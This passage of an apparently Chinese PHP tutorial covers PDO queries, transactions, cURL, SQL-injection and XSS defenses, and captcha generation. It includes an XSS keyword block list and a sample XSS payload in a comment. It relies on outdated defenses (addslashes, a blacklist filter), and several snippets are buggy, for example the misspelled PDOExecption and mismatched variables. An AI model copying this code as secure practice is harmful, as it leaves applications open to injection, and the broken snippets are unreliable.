class="string">&quot;西贝乐&quot;</span>));</span><br><span class="line"><span class="comment">// 5.获得结果</span></span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">get_result</span>();</span><br><span class="line"><span class="comment">// 6.处理每一行数据</span></span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;&#125;</span><br></pre></td></tr></table></figure><h4 id="4-4-PDO流程案例"><a href="#4-4-PDO流程案例" class="headerlink" title="4.4 PDO流程案例"></a>4.4 PDO流程案例</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PDO</span></span><br><span class="line"><span class="comment">// PDO的安装，php5.1以上默认安装PDO</span></span><br><span class="line">;extension=php_pdo.dll <span class="comment">// 去掉注释打开，之后选择下面链接的数据库。（文件中也可能没有）</span></span><br><span class="line">;extension=php_pdo_mysql.dll <span class="comment">// mysql</span></span><br><span class="line">;extension=php_pdo_mssql.dll <span class="comment">// SQL Server</span></span><br><span class="line">;extension=php_pdo_oci.dll <span class="comment">// Oracle</span></span><br><span class="line">;extension=php_pdo_obdc.dll <span class="comment">// OBDC，访问微软数据库可以用ODBC</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 初始化PDO</span></span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$dsn</span>=<span class="string">&quot;mysql:host=localhost;dbname=guestbook&quot;</span>;</span><br><span class="line">    <span class="variable">$db</span>=<span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>,<span class="variable">$db_username</span>,<span class="variable">$db_password</span>);</span><br><span class="line">    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;set names utf8&quot;</span>); <span class="comment">//设置字符编码</span></span><br><span class="line"><span class="comment">//设置PDO错误警告模式，用于调试</span></span><br><span class="line">    <span class="comment">//$db-&gt;setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_WARNING);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>( PDOException <span class="variable">$e</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;error:&quot;</span>. <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>() . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行操作</span></span><br><span class="line"><span class="variable">$list</span>=<span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetchAll</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$list</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;用户名:&#x27;</span>.<span class="variable">$value</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;，昵称:&#x27;</span>.<span class="variable">$value</span>[<span class="string">&#x27;nickname&#x27;</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放资源</span></span><br><span class="line"><span class="variable">$res</span>=<span class="literal">null</span>;</span><br><span class="line"><span class="variable">$db</span>=<span class="literal">null</span>;</span><br></pre></td></tr></table></figure><h4 id="4-5-PDO事务操作"><a href="#4-5-PDO事务操作" class="headerlink" title="4.5 PDO事务操作"></a>4.5 PDO事务操作</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 开启事务，关闭自动提交模式</span></span><br><span class="line"><span class="variable">$db</span>-&gt;<span class="title function_ invoke__">beginTransaction</span>();</span><br><span class="line"><span class="comment">// 提交事务，然后回到自动提交模式</span></span><br><span class="line"><span class="variable">$db</span>-&gt;<span class="title function_ invoke__">commit</span>();</span><br><span class="line"><span class="comment">// 回滚事务</span></span><br><span class="line"><span class="variable">$db</span>-&gt;<span class="title function_ invoke__">rollBack</span>();</span><br><span class="line"><span class="comment">// 检查是否在一个事务内，如果当前事务处于激活状态则返回true</span></span><br><span class="line"><span class="variable">$db</span>-&gt;<span class="title function_ invoke__">inTransaction</span>();</span><br></pre></td></tr></table></figure><h4 id="4-6-PDO事务案例"><a href="#4-6-PDO事务案例" class="headerlink" title="4.6 PDO事务案例"></a>4.6 PDO事务案例</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$dsn</span>=<span class="string">&quot;mysql:host=localhost;dbname=guestbook&quot;</span>;</span><br><span class="line">    <span class="variable">$option</span>=<span class="keyword">array</span>(PDO::<span class="variable constant_">ATTR_AUTOCOMMIT</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$db</span>=<span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="variable">$options</span>);</span><br><span class="line">    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;set names utf8&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>( PDOException <span class="variable">$e</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;error:&quot;</span>. <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>() . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">beginTransaction</span>();</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">inTransaction</span>()); <span class="comment">// 激活返回true</span></span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;update lyb set sex=&#x27;female&#x27; where sex=&#x27;2&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$res_1</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$res_1</span> == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PDOExecption</span>(<span class="string">&#x27;update sex failed!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$res_2</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="string">&quot;update lyb set title=&#x27;teacher&#x27; where title like &#x27;%ab%&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$res_2</span> == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PDOExecption</span>(<span class="string">&#x27;update sex title!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">commit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(PDOException <span class="variable">$e</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">rollBack</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5-cURL"><a href="#5-cURL" class="headerlink" title="5 cURL"></a>5 cURL</h3><blockquote><p><a href="https://www.runoob.com/php/php-ref-curl.html">cURL 函数</a></p><p><a href="https://www.runoob.com/php/func-curl_setopt.html">curl_setopt函数</a></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// cURL流程</span></span><br><span class="line"><span class="comment">// 创建一个cURL资源</span></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置URL和相应的选项</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="string">&quot;http://www.w3cschool.cc/&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 抓取URL并把它传递给浏览器</span></span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭cURL资源，并且释放系统资源</span></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">    </span><br><span class="line"><span class="comment">// cURL多线程</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="四、PHP安全编程"><a href="#四、PHP安全编程" class="headerlink" title="四、PHP安全编程"></a>四、PHP安全编程</h2><h3 id="1-安全配置"><a href="#1-安全配置" class="headerlink" title="1 安全配置"></a>1 安全配置</h3><h3 id="2-SQL注入"><a href="#2-SQL注入" class="headerlink" title="2 SQL注入"></a>2 SQL注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.addslashes</span></span><br><span class="line"><span class="title function_ invoke__">addslashes</span>(<span class="variable">$str</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.参数化查询</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-跨站脚本"><a href="#3-跨站脚本" class="headerlink" title="3 跨站脚本"></a>3 跨站脚本</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.htmlspecialchars，将下列实体进行转化：&lt;,&gt;,&amp;,&quot;,&#x27;</span></span><br><span class="line"><span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.自定义（网上下载的）</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//RemoveXss函数主要用于跨站脚本的过滤</span></span><br><span class="line"><span class="comment">//Remove the exploer&#x27;bug XSS</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">remove_xss</span>(<span class="params"><span class="variable">$val</span></span>) </span>&#123;</span><br><span class="line">   <span class="comment">// remove all non-printable characters. CR(0a) and LF(0b) and TAB(9) are allowed</span></span><br><span class="line">   <span class="comment">// this prevents some character re-spacing such as &lt;java\0script&gt;</span></span><br><span class="line">   <span class="comment">// note that you have to handle splits with \n, \r, and \t later since they *are* allowed in some inputs</span></span><br><span class="line">   <span class="variable">$val</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$val</span>);</span><br><span class="line">   <span class="comment">// straight replacements, the user should never need these since they&#x27;re normal characters</span></span><br><span class="line">   <span class="comment">// this prevents like &lt;IMG SRC=@avascript:alert(&#x27;XSS&#x27;)&gt;</span></span><br><span class="line">   <span class="variable">$search</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>;</span><br><span class="line">   <span class="variable">$search</span> .= <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line">   <span class="variable">$search</span> .= <span class="string">&#x27;1234567890!@#$%^&amp;*()&#x27;</span>;</span><br><span class="line">   <span class="variable">$search</span> .= <span class="string">&#x27;~`&quot;;:?+/=&#123;&#125;[]-_|\&#x27;\\&#x27;</span>;</span><br><span class="line">   <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$search</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">      <span class="comment">// ;? matches the ;, which is optional</span></span><br><span class="line">      <span class="comment">// 0&#123;0,7&#125; matches any padded zeros, which are optional and go up to 8 chars</span></span><br><span class="line">      <span class="comment">// @ @ search for the hex values</span></span><br><span class="line">      <span class="variable">$val</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(&amp;#[xX]0&#123;0,8&#125;&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$search</span>[<span class="variable">$i</span>])).<span class="string">&#x27;;?)/i&#x27;</span>, <span class="variable">$search</span>[<span class="variable">$i</span>], <span class="variable">$val</span>); <span class="comment">// with a ;</span></span><br><span class="line">      <span class="comment">// @ @ 0&#123;0,7&#125; matches &#x27;0&#x27; zero to seven times</span></span><br><span class="line">      <span class="variable">$val</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(&amp;#0&#123;0,8&#125;&#x27;</span>.<span class="title function_ invoke__">ord</span>(<span class="variable">$search</span>[<span class="variable">$i</span>]).<span class="string">&#x27;;?)/&#x27;</span>, <span class="variable">$search</span>[<span class="variable">$i</span>], <span class="variable">$val</span>); <span class="comment">// with a ;</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">// now the only remaining whitespace attacks are \t, \n, and \r</span></span><br><span class="line">   <span class="variable">$ra1</span> = <span class="keyword">array</span>(<span class="string">&#x27;javascript&#x27;</span>, <span class="string">&#x27;vbscript&#x27;</span>, <span class="string">&#x27;expression&#x27;</span>, <span class="string">&#x27;applet&#x27;</span>, <span class="string">&#x27;meta&#x27;</span>, <span class="string">&#x27;xml&#x27;</span>, <span class="string">&#x27;blink&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;style&#x27;</span>, <span class="string">&#x27;script&#x27;</span>, <span class="string">&#x27;embed&#x27;</span>, <span class="string">&#x27;object&#x27;</span>, <span class="string">&#x27;iframe&#x27;</span>, <span class="string">&#x27;frame&#x27;</span>, <span class="string">&#x27;frameset&#x27;</span>, <span class="string">&#x27;ilayer&#x27;</span>, <span class="string">&#x27;layer&#x27;</span>, <span class="string">&#x27;bgsound&#x27;</span>, <span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;base&#x27;</span>);</span><br><span class="line">   <span class="variable">$ra2</span> = <span class="keyword">array</span>(<span class="string">&#x27;onabort&#x27;</span>, <span class="string">&#x27;onactivate&#x27;</span>, <span class="string">&#x27;onafterprint&#x27;</span>, <span class="string">&#x27;onafterupdate&#x27;</span>, <span class="string">&#x27;onbeforeactivate&#x27;</span>, <span class="string">&#x27;onbeforecopy&#x27;</span>, <span class="string">&#x27;onbeforecut&#x27;</span>, <span class="string">&#x27;onbeforedeactivate&#x27;</span>, <span class="string">&#x27;onbeforeeditfocus&#x27;</span>, <span class="string">&#x27;onbeforepaste&#x27;</span>, <span class="string">&#x27;onbeforeprint&#x27;</span>, <span class="string">&#x27;onbeforeunload&#x27;</span>, <span class="string">&#x27;onbeforeupdate&#x27;</span>, <span class="string">&#x27;onblur&#x27;</span>, <span class="string">&#x27;onbounce&#x27;</span>, <span class="string">&#x27;oncellchange&#x27;</span>, <span class="string">&#x27;onchange&#x27;</span>, <span class="string">&#x27;onclick&#x27;</span>, <span class="string">&#x27;oncontextmenu&#x27;</span>, <span class="string">&#x27;oncontrolselect&#x27;</span>, <span class="string">&#x27;oncopy&#x27;</span>, <span class="string">&#x27;oncut&#x27;</span>, <span class="string">&#x27;ondataavailable&#x27;</span>, <span class="string">&#x27;ondatasetchanged&#x27;</span>, <span class="string">&#x27;ondatasetcomplete&#x27;</span>, <span class="string">&#x27;ondblclick&#x27;</span>, <span class="string">&#x27;ondeactivate&#x27;</span>, <span class="string">&#x27;ondrag&#x27;</span>, <span class="string">&#x27;ondragend&#x27;</span>, <span class="string">&#x27;ondragenter&#x27;</span>, <span class="string">&#x27;ondragleave&#x27;</span>, <span class="string">&#x27;ondragover&#x27;</span>, <span class="string">&#x27;ondragstart&#x27;</span>, <span class="string">&#x27;ondrop&#x27;</span>, <span class="string">&#x27;onerror&#x27;</span>, <span class="string">&#x27;onerrorupdate&#x27;</span>, <span class="string">&#x27;onfilterchange&#x27;</span>, <span class="string">&#x27;onfinish&#x27;</span>, <span class="string">&#x27;onfocus&#x27;</span>, <span class="string">&#x27;onfocusin&#x27;</span>, <span class="string">&#x27;onfocusout&#x27;</span>, <span class="string">&#x27;onhelp&#x27;</span>, <span class="string">&#x27;onkeydown&#x27;</span>, <span class="string">&#x27;onkeypress&#x27;</span>, <span class="string">&#x27;onkeyup&#x27;</span>, <span class="string">&#x27;onlayoutcomplete&#x27;</span>, <span class="string">&#x27;onload&#x27;</span>, <span class="string">&#x27;onlosecapture&#x27;</span>, <span class="string">&#x27;onmousedown&#x27;</span>, <span class="string">&#x27;onmouseenter&#x27;</span>, <span class="string">&#x27;onmouseleave&#x27;</span>, <span class="string">&#x27;onmousemove&#x27;</span>, <span class="string">&#x27;onmouseout&#x27;</span>, <span class="string">&#x27;onmouseover&#x27;</span>, <span class="string">&#x27;onmouseup&#x27;</span>, <span class="string">&#x27;onmousewheel&#x27;</span>, <span class="string">&#x27;onmove&#x27;</span>, <span class="string">&#x27;onmoveend&#x27;</span>, <span class="string">&#x27;onmovestart&#x27;</span>, <span class="string">&#x27;onpaste&#x27;</span>, <span class="string">&#x27;onpropertychange&#x27;</span>, <span class="string">&#x27;onreadystatechange&#x27;</span>, <span class="string">&#x27;onreset&#x27;</span>, <span class="string">&#x27;onresize&#x27;</span>, <span class="string">&#x27;onresizeend&#x27;</span>, <span class="string">&#x27;onresizestart&#x27;</span>, <span class="string">&#x27;onrowenter&#x27;</span>, <span class="string">&#x27;onrowexit&#x27;</span>, <span class="string">&#x27;onrowsdelete&#x27;</span>, <span class="string">&#x27;onrowsinserted&#x27;</span>, <span class="string">&#x27;onscroll&#x27;</span>, <span class="string">&#x27;onselect&#x27;</span>, <span class="string">&#x27;onselectionchange&#x27;</span>, <span class="string">&#x27;onselectstart&#x27;</span>, <span class="string">&#x27;onstart&#x27;</span>, <span class="string">&#x27;onstop&#x27;</span>, <span class="string">&#x27;onsubmit&#x27;</span>, <span class="string">&#x27;onunload&#x27;</span>);</span><br><span class="line">   <span class="variable">$ra</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$ra1</span>, <span class="variable">$ra2</span>);</span><br><span class="line">   <span class="variable">$found</span> = <span class="literal">true</span>; <span class="comment">// keep replacing as long as the previous round replaced something</span></span><br><span class="line">   <span class="keyword">while</span> (<span class="variable">$found</span> == <span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="variable">$val_before</span> = <span class="variable">$val</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$ra</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">         <span class="variable">$pattern</span> = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">         <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ra</span>[<span class="variable">$i</span>]); <span class="variable">$j</span>++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$j</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">               <span class="variable">$pattern</span> .= <span class="string">&#x27;(&#x27;</span>;</span><br><span class="line">               <span class="variable">$pattern</span> .= <span class="string">&#x27;(&amp;#[xX]0&#123;0,8&#125;([9ab]);)&#x27;</span>;</span><br><span class="line">               <span class="variable">$pattern</span> .= <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">               <span class="variable">$pattern</span> .= <span class="string">&#x27;|(&amp;#0&#123;0,8&#125;([9|10|13]);)&#x27;</span>;</span><br><span class="line">               <span class="variable">$pattern</span> .= <span class="string">&#x27;)*&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$pattern</span> .= <span class="variable">$ra</span>[<span class="variable">$i</span>][<span class="variable">$j</span>];</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="variable">$pattern</span> .= <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">         <span class="variable">$replacement</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$ra</span>[<span class="variable">$i</span>], <span class="number">0</span>, <span class="number">2</span>).<span class="string">&#x27;&lt;x&gt;&#x27;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$ra</span>[<span class="variable">$i</span>], <span class="number">2</span>); <span class="comment">// add in &lt;&gt; to nerf the tag</span></span><br><span class="line">         <span class="variable">$val</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$val</span>); <span class="comment">// filter out the hex tags</span></span><br><span class="line">         <span class="keyword">if</span> (<span class="variable">$val_before</span> == <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="comment">// no replacements were made, so exit the loop</span></span><br><span class="line">            <span class="variable">$found</span> = <span class="literal">false</span>;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="variable">$val</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-身份认证"><a href="#4-身份认证" class="headerlink" title="4 身份认证"></a>4 身份认证</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 安全函数</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 验证码生成</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>(); <span class="comment">// 开启session</span></span><br><span class="line"><span class="variable">$image</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">100</span>,<span class="number">30</span>); <span class="comment">// 1.创建黑色画布</span></span><br><span class="line"><span class="variable">$bgcolor</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$image</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>); <span class="comment">// 2.定义背景颜色为白色</span></span><br><span class="line"><span class="title function_ invoke__">imagefill</span>(<span class="variable">$image</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="variable">$bgcolor</span>); <span class="comment">// 3.填充背景颜色</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">join</span>(<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">array_merge</span>(<span class="title function_ invoke__">range</span>(<span class="number">0</span>,<span class="number">9</span>),<span class="title function_ invoke__">range</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;z&#x27;</span>),<span class="title function_ invoke__">range</span>(<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>))); <span class="comment">// 4.1定义验证码内容</span></span><br><span class="line"><span class="variable">$captcha</span> = <span class="string">&quot;&quot;</span>; <span class="comment">// 4.2创建一个变量存储产生的验证码数据，便于用户提交核对</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">4</span>;<span class="variable">$i</span>++) <span class="comment">// 绘制四个字符</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$fontsize</span> = <span class="number">10</span>; <span class="comment">// 字体大小</span></span><br><span class="line">    <span class="variable">$fontcolor</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$image</span>,<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">120</span>),<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">120</span>),<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">120</span>)); <span class="comment">// 字体颜色为随机值</span></span><br><span class="line">    <span class="variable">$fontcontent</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$content</span>,<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>)),<span class="number">1</span>); <span class="comment">// 设置字体内容</span></span><br><span class="line">    <span class="variable">$captcha</span> .= <span class="variable">$fontcontent</span>;</span><br><span class="line">    <span class="variable">$x</span> = (<span class="variable">$i</span> * <span class="number">100</span> / <span class="number">4</span>) + <span class="title function_ invoke__">mt_rand</span>(<span class="number">5</span>,<span class="number">10</span>); <span class="comment">// 显示的坐标</span></span><br><span class="line">    <span class="variable">$y</span> = <span class="title function_ invoke__">mt_rand</span>(<span class="number">5</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="title function_ invoke__">imagestring</span>(<span class="variable">$image</span>,<span class="variable">$fontsize</span>,<span class="variable">$x</span>,<span class="variable">$y</span>,<span class="variable">$fontcontent</span>,<span class="variable">$fontcolor</span>); <span class="comment">// 输出一个字符到画布</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;captcha&quot;</span>] = <span class="variable">$captcha</span>; <span class="comment">// 将验证码保存到session变量中</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">200</span>;<span class="variable">$i</span>++) <span class="comment">// 4.3设置背景干扰元素</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$pointcolor</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$image</span>,<span class="title function_ invoke__">mt_rand</span>(<span class="number">50</span>,<span class="number">200</span>),<span class="title function_ invoke__">mt_rand</span>(<span class="number">50</span>,<span class="number">200</span>),<span class="title function_ invoke__">mt_rand</span>(<span class="number">50</span>,<span class="number">200</span>));</span><br><span class="line">    <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$image</span>,<span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">99</span>),<span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">29</span>),<span class="variable">$pointcolor</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">3</span>;<span class="variable">$i</span>++) <span class="comment">// 4.4设置干扰线 </span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$linecolor</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$image</span>,<span class="title function_ invoke__">mt_rand</span>(<span class="number">50</span>,<span class="number">200</span>),<span class="title function_ invoke__">mt_rand</span>(<span class="number">50</span>,<span class="number">200</span>),<span class="title function_ invoke__">mt_rand</span>(<span class="number">50</span>,<span class="number">200</span>));</span><br><span class="line"><span class="title function_ invoke__">imageline</span>(<span class="variable">$image</span>,<span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">99</span>),<span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">29</span>),<span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">99</span>),<span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">29</span>),<span class="variable">$linecolor</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:image/png&#x27;</span>); <span class="comment">// 5.强制浏览器输出.png格式图片文件</span></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$image</span>); <span class="comment">// 6.输出图片到浏览器</span></span><br><span class="line"><span class="title function_ invoke__">imagedestroy</span>(<span class="variable">$image</span>); <span class="comment">// 7.销毁图片</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5-编程流程"><a href="#5-编程流程" class="headerlink" title="5 编程流程"></a>5 编程流程</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.头文件中文设置</span></span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.开启session和时区，包含防跳墙</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">session_status</span>() == PHP_SESSION_NONE) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&#x27;Asia/Shanghai&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;wall.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.获得数据（注意XSS和SQL注入）</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$target</span> = <span class="title function_ invoke__">addslashes</span>(<span class="title function_ invoke__">remove_xss</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;search_content&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 4.连接数据库</span></span><br><span 